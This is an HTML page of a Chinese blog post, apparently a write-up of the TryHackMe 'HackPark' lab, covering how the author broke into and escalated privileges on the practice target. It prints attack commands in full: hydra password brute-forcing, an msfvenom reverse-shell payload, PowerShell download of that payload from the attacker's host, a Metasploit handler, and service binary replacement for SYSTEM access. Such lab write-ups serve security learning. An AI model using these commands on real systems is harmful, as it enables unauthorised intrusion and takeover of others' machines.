@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://gcore.jsdelivr.net'>
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>Try Hack Me-HackPark - v2ish1yan`s blog</title>
+
+  
+    <meta name="description" content="爆破密码，登录后台使用gobuster配合seclists的字典来爆破后台路径 1.&#x2F;gobuster dir -u 10.10.40.22 -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt  发现后台路径 image-20230103215608183  然后发送表单数据，可以知道是POST请求 image-2023010321573">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Try Hack Me-HackPark">
+<meta property="og:url" content="http://example.com/2023/07/03/%E9%9D%B6%E6%9C%BA/THM_HackPark/index.html">
+<meta property="og:site_name" content="v2ish1yan&#96;s blog">
+<meta property="og:description" content="爆破密码，登录后台使用gobuster配合seclists的字典来爆破后台路径 1.&#x2F;gobuster dir -u 10.10.40.22 -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt  发现后台路径 image-20230103215608183  然后发送表单数据，可以知道是POST请求 image-2023010321573">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032158581.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032158572.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032244556.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032301496.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032303588.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032316631.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032330196.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032334621.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041332791.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041359769.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041418128.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041422881.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041422335.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041423172.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041432132.png">
+<meta property="article:published_time" content="2023-07-03T08:59:13.375Z">
+<meta property="article:modified_time" content="2023-07-03T08:59:13.430Z">
+<meta property="article:author" content="v2ish1yan">
+<meta property="article:tag" content="Try Hack Me">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032158581.png">
+  
+  
+  
+  <meta name="keywords" content="Try Hack Me">
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120002492.png">
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120001591.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">v2ish1yan`s blog</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/links/">友链</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">Try Hack Me-HackPark</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81%EF%BC%8C%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-text">爆破密码，登录后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97webshell"><span class="toc-text">获得webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8metesploit%E7%9B%91%E5%90%ACshell"><span class="toc-text">使用metesploit监听shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E9%80%9A%E8%BF%87metesploit%E7%9B%91%E5%90%ACshell%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-text">不通过metesploit监听shell的方式</span></a></li></ol></div></div></widget>
+
+
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Tryhackme/">Tryhackme</a></div><div id="post-meta">发布于&nbsp;<time datetime="2023-07-03T08:59:13.375Z">2023-07-03</time></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>Try Hack Me-HackPark</span></h1>
+<h2 id="爆破密码，登录后台"><a href="#爆破密码，登录后台" class="headerlink" title="爆破密码，登录后台"></a>爆破密码，登录后台</h2><p>使用gobuster配合seclists的字典来爆破后台路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gobuster <span class="built_in">dir</span> -u 10.10.40.22 -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>发现后台路径</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032158581.png" alt="image-20230103215608183" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230103215608183</span></div></div>
+
+<p>然后发送表单数据，可以知道是POST请求</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032158572.png" alt="image-20230103215732978" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230103215732978</span></div></div>
+
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">hydra</a>爆破密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt    10.10.40.22 http-form-post <span class="string">&quot;/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=vw5J1ZVXeuOsqHTRBMThsDt0My7yl9%2F58xs%2F9JecZf3L2TxMaYYCfEmvjBo7dAo2xU9lY9qG1RqV9Q%2FwCyuJhBGGIbX1BF4vSV9uhs1Jp%2B%2BDW8x3IyAETgYpstaFI%2B5vjy0OXYvDA%2F%2Bo%2BltAyih7HFg3YOCIFUxjN5Uqda41582vq4gw&amp;__EVENTVALIDATION=F16dU6mFH%2FZqYExyyFz8QDA2ZfV%2F9lhAJf8knWmPcA%2BSalr%2FtNT8OI%2FcLoS1WfVqi%2BcLjNuR278Z6EUr21MfgT6qFfcnIC%2FnBVi32%2BlQ2QUhax%2F0FiRUxsFmaFhgRgK6DPIkxvtN8gA53zqN8cVhWrMuB7NhxDbpKdxVFan86w5lUB%2BX&amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed&quot;</span> -Vv</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -Vv 显示破解过程</span></span><br><span class="line"><span class="comment"># -l 表示单个密码</span></span><br><span class="line"><span class="comment"># -P 表示多个密码，一般为文件</span></span><br><span class="line"><span class="comment">#Login Failedb 表示的是如果登录失败，页面返回的内容</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的密码要用<code>^PASS^</code>来占位</p>
+<p>得到密码:<code>1qaz2wsx</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032244556.png" alt="image-20230103224403526" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230103224403526</span></div></div>
+
+<table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>hydra -P <wordlist> -v <ip> <protocol></td>
+<td>针对您选择的协议进行暴力破解</td>
+</tr>
+<tr>
+<td>hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol></td>
+<td>您可以使用 Hydra 来暴力破解用户名和密码。它将遍历列表中的每个组合。（-vV &#x3D; 详细模式，显示登录尝试）</td>
+</tr>
+<tr>
+<td>hydra -t 1 -V -f -l <username> -P <wordlist> rdp:&#x2F;&#x2F;<ip></td>
+<td>使用密码列表攻击 Windows 远程桌面。</td>
+</tr>
+<tr>
+<td>hydra -l <username> -P .<password list> $ip -V http-form-post ‘&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^&amp;wp-submit&#x3D;Log In&amp;testcookie&#x3D;1:S&#x3D;Location’</td>
+<td>为 Hydra 提出更具体的要求以进行暴力破解。</td>
+</tr>
+</tbody></table>
+<h2 id="获得webshell"><a href="#获得webshell" class="headerlink" title="获得webshell"></a>获得webshell</h2><p>登入后台，发现这个网站的CMS为<code>BlogEngine.NET</code>，且版本为3.3.6.0</p>
+<p>在<a target="_blank" rel="noopener" href="http://www.exploit-db.com/">exploit 数据库存档</a>查找相关漏洞</p>
+<p>找到<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46353">CVE-2019-6714</a><br>按照要求，改一下exp里的ip和port，把文件名改为PostView.ascx，然后再上传</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032301496.png" alt="image-20230103230104393" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230103230104393</span></div></div>
+
+<p>kali开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>/?theme=../../App_Data/files</code>后得到反弹shell</p>
+<p>执行<code>whoami</code>得到运行这个网站的人</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032303588.png" alt="image-20230103230346561" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230103230346561</span></div></div>
+
+<h2 id="使用metesploit监听shell"><a href="#使用metesploit监听shell" class="headerlink" title="使用metesploit监听shell"></a>使用metesploit监听shell</h2><p>然后改用metesploit的meterpreter来进行监听</p>
+<p>要先找到这个windows的漏洞，然后再用msfvenom生成攻击载荷</p>
+<p>先用<code>systeminfo</code>得到这个windows的信息，然后用<a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">wes-ng</a>来查找漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wes.py system.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032316631.png" alt="image-20230103231646552" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230103231646552</span></div></div>
+
+<p>这里得到的信息其实没有那么重要，因为我们已经有一个shell了</p>
+<p>我们可以生成一个反弹shell载荷，让目标主机下载下来，然后让他执行这个载荷，就可以反弹shell了</p>
+<p>生成payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.104.32  LPORT=9999 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>在kali上开启一个python服务，通过之前的shell，让目标主机下载下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server   </span><br></pre></td></tr></table></figure>
+
+<p>目标主机上：</p>
+<p>上传到<code>C:\Windows\Temp</code>因为这个目录往往是可写的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c <span class="string">&quot;Invoke-WebRequest -Uri &#x27;http://10.18.104.32:8000/shell.exe&#x27; -OutFile &#x27;C:\Windows\Temp\shell.exe&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>shell.exe被成功上传</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032330196.png" alt="image-20230103233054145" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230103233054145</span></div></div>
+
+<p>然后开启metesploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 10.18.104.32</span><br><span class="line"><span class="built_in">set</span> LPORT 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>在目标主机执行shell.exe</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>meterpreter成功上线目标主机</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301032334621.png" alt="image-20230103233429588" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230103233429588</span></div></div>
+
+<p>执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
+
+<p>可以查看系统信息</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041332791.png" alt="image-20230104133205675" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230104133205675</span></div></div>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们要进行提权，使用<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASbat"><strong>WinPEAS</strong></a>来查看相关的信息</p>
+<p>使用相同的方式来上传这个文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c <span class="string">&quot;Invoke-WebRequest -Uri &#x27;http://10.18.104.32:8000/winPEAS.bat&#x27; -OutFile &#x27;C:\Windows\Temp\winPEAS.bat&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为系统服务大多是以system权限启动的，所以其对应的二进制也就以system权限启动。</p>
+<p>所以这里提权的方式是，修改系统服务对应的二进制文件，将其修改为我们的攻击载荷，即上面的<code>shell.exe</code>。</p>
+<p>用winpeas.bat可以看到一些服务对应的二进制文件</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041359769.png" alt="image-20230104135959702" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230104135959702</span></div></div>
+
+<p>使用winpeas.exe直接查看服务信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe serviceinfo</span><br></pre></td></tr></table></figure>
+
+<p>winpeas.exe参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">domain               Enumerate domain information</span><br><span class="line">systeminfo           Search system information</span><br><span class="line">userinfo             Search user information</span><br><span class="line">processinfo          Search processes information</span><br><span class="line">servicesinfo         Search services information</span><br><span class="line">applicationsinfo     Search installed applications information</span><br><span class="line">networkinfo          Search network information</span><br><span class="line">windowscreds         Search windows credentials</span><br><span class="line">browserinfo          Search browser information</span><br><span class="line">filesinfo            Search generic files that can contains credentials</span><br><span class="line">fileanalysis         Search specific files that can contains credentials and for regexes inside files</span><br><span class="line">eventsinfo           Display interesting events information</span><br><span class="line"></span><br><span class="line">quiet                Do not print banner</span><br><span class="line">notcolor             Don&#x27;t use ansi colors (all white)</span><br><span class="line">searchpf             Search credentials via regex also in Program Files folders</span><br><span class="line">wait                 Wait for user input between checks</span><br><span class="line">debug                Display debugging information - memory usage, method execution time</span><br><span class="line">log[=logfile]        Log all output to file defined as logfile, or to &quot;out.txt&quot; if not specified</span><br><span class="line">MaxRegexFileSize=1000000        Max file size (in Bytes) to search regex in. Default: 1000000B</span><br><span class="line"></span><br><span class="line">Additional checks (slower):</span><br><span class="line">-lolbas              Run additional LOLBAS check</span><br><span class="line">-linpeas=[url]       Run additional linpeas.sh check for default WSL distribution, optionally provide custom linpeas.sh URL</span><br><span class="line">                     (default: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到存在可以提权的服务<code>WindowsScheduler</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041418128.png" alt="image-20230104141834072" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230104141834072</span></div></div>
+
+<p>去到对应目录，可以发现存在包含日志的<code>Events</code>目录</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041422881.png" alt="image-20230104142213846" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230104142213846</span></div></div>
+
+<p>查看日志，发现他是间隔30s左右，执行一次<code>Message.exe</code>，且以Administrator权限执行</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041422335.png" alt="image-20230104142244294" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230104142244294</span></div></div>
+
+<p>再去看这个文件，发现可以修改</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041423172.png" alt="image-20230104142318141" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230104142318141</span></div></div>
+
+<p>把之前生成的shell.exe上传到这里，改名为Message.exe，然后再开启一个监听，就可以得到system权限的shell</p>
+<p>直接使用meterpreter上传</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upload shell.exe <span class="string">&quot;C:\Program Files (x86)\SystemScheduler\1.exe&quot;</span></span><br><span class="line"><span class="built_in">mv</span> Message.exe Message.exe.bak</span><br><span class="line"><span class="built_in">mv</span> 1.exe Message.exe</span><br><span class="line">background</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>等他执行我们上传上去的恶意Message.exe后，就可以得到system权限的shell</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301041432132.png" alt="image-20230104143237095" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20230104143237095</span></div></div>
+
+<p>然后在<code>C:\Users\jeff\Desktop\user.txt</code>得到user flag</p>
+<p>在<code>C:\Users\Administrator\Desktop\root.txt</code>得到root flag</p>
+<h2 id="不通过metesploit监听shell的方式"><a href="#不通过metesploit监听shell的方式" class="headerlink" title="不通过metesploit监听shell的方式"></a>不通过metesploit监听shell的方式</h2><p>可以使用netcat，但是msfvenom生成payload的命令有所不同</p>
